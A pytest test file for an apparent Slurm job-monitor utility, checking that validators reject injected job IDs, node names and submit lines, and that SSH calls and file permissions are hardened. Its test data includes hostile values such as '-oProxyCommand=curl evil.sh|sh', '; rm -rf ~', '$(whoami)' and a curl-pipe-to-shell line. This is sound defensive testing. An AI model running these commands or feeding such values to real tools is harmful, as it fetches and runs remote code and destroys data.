"""Guards against argument injection and unintended command execution."""
import pytest

INJECTION = [
    "-oProxyCommand=curl evil.sh|sh",
    "--help",
    "; rm -rf ~",
    "$(whoami)",
    "`id`",
    "1 2",
    "../../etc/passwd",
    "",
]


class TestJobIdValidation:
    @pytest.mark.parametrize("bad", INJECTION)
    def test_rejects_hostile_values(self, sd, bad):
        assert sd.is_valid_jobid(bad) is False

    @pytest.mark.parametrize("good", ["1", "123", "123_4", "123_[0-9]",
                                      "123.batch", "123.extern", "123+0"])
    def test_accepts_real_slurm_ids(self, sd, good):
        assert sd.is_valid_jobid(good) is True


class TestNodeNameValidation:
    @pytest.mark.parametrize("bad", INJECTION + ["-node01", "node 01"])
    def test_rejects_hostile_values(self, sd, bad):
        assert sd.is_valid_nodename(bad) is False

    @pytest.mark.parametrize("good", ["n1", "gpu-node01", "node01.cluster.local"])
    def test_accepts_real_hostnames(self, sd, good):
        assert sd.is_valid_nodename(good) is True

    def test_overlong_name_rejected(self, sd):
        assert sd.is_valid_nodename("a" * 256) is False


class TestResubmitGuard:
    """A submit line recovered from sacct or an editable JSON file is data,
    not a command to trust."""

    @pytest.mark.parametrize("line", [
        "/bin/sh -c 'curl evil | sh'",
        "rm -rf /home/user",
        "bash -c whoami",
        "python3 -c 'import os'",
        "",
        "   ",
        "sbatch 'unbalanced",
    ])
    def test_rejects_non_sbatch(self, sd, line):
        assert sd.build_sbatch_args(line) is None

    @pytest.mark.parametrize("line,expected", [
        ("sbatch job.sh", ["sbatch", "job.sh"]),
        ("sbatch --mem=4G -N2 job.sh", ["sbatch", "--mem=4G", "-N2", "job.sh"]),
        ("/usr/bin/sbatch job.sh", ["sbatch", "job.sh"]),
        ("sbatch '/path/with spaces/job.sh'", ["sbatch", "/path/with spaces/job.sh"]),
    ])
    def test_accepts_real_sbatch_lines(self, sd, line, expected):
        assert sd.build_sbatch_args(line) == expected


class TestSshHardening:
    def test_refuses_hostile_node_name(self, sd, monkeypatch):
        called = []
        monkeypatch.setattr(sd.subprocess, "run",
                            lambda *a, **k: called.append(a) or None)
        assert sd.ssh_cmd("-oProxyCommand=x", "id") == ""
        assert called == []

    def test_disabled_by_config(self, sd, monkeypatch):
        called = []
        monkeypatch.setattr(sd.subprocess, "run",
                            lambda *a, **k: called.append(a) or None)
        monkeypatch.setitem(sd.CONFIG["monitor"], "use_ssh", False)
        assert sd.ssh_cmd("node01", "id") == ""
        assert called == []

    def test_uses_safe_ssh_options(self, sd, monkeypatch):
        seen = {}

        class Result:
            stdout = "ok"

        def fake_run(cmd, **kwargs):
            seen["cmd"] = cmd
            seen["kwargs"] = kwargs
            return Result()

        monkeypatch.setitem(sd.CONFIG["monitor"], "use_ssh", True)
        monkeypatch.setattr(sd.subprocess, "run", fake_run)
        sd.ssh_cmd("node01", "uptime")
        cmd = seen["cmd"]
        assert "-n" in cmd                                  # never read our stdin
        assert "StrictHostKeyChecking=accept-new" in cmd    # refuses changed keys
        assert "BatchMode=yes" in cmd                       # never prompts
        assert "--" in cmd and cmd.index("--") < cmd.index("node01")
        assert seen["kwargs"]["stdin"] is not None


class TestFilePermissions:
    def test_history_is_private(self, sd, isolated):
        sd.save_history([{"jobid": "1", "name": "x"}])
        assert oct(isolated.joinpath("history.json").stat().st_mode & 0o777) == "0o600"

    def test_event_log_is_private(self, sd, isolated):
        sd.append_event_log("10:00:00", "hello")
        assert oct(isolated.joinpath("events.log").stat().st_mode & 0o777) == "0o600"

    def test_templates_are_private(self, sd, isolated):
        sd.save_templates([{"name": "t", "values": {"script": "a.sh"}}],
                          isolated / "templates.json")
        assert oct(isolated.joinpath("templates.json").stat().st_mode & 0o777) == "0o600"


class TestCompletionHook:
    def test_ignores_missing_or_non_executable_hook(self, sd, tmp_path, monkeypatch):
        called = []
        monkeypatch.setattr(sd.subprocess, "run", lambda *a, **k: called.append(a))
        plain = tmp_path / "hook.sh"
        plain.write_text("#!/bin/sh\n")            # not chmod +x
        sd.run_completion_hook(str(plain), "1", "COMPLETED", "job")
        sd.run_completion_hook(str(tmp_path / "missing.sh"), "1", "COMPLETED", "job")
        sd.run_completion_hook("", "1", "COMPLETED", "job")
        assert called == []

    def test_runs_executable_hook_with_argv(self, sd, tmp_path, monkeypatch):
        import os
        seen = {}
        monkeypatch.setattr(sd.subprocess, "run",
                            lambda cmd, **k: seen.update(cmd=cmd))
        hook = tmp_path / "hook.sh"
        hook.write_text("#!/bin/sh\necho hi\n")
        os.chmod(hook, 0o755)
        sd.run_completion_hook(str(hook), "42", "FAILED", "train")
        assert seen["cmd"] == [str(hook), "42", "FAILED", "train"]
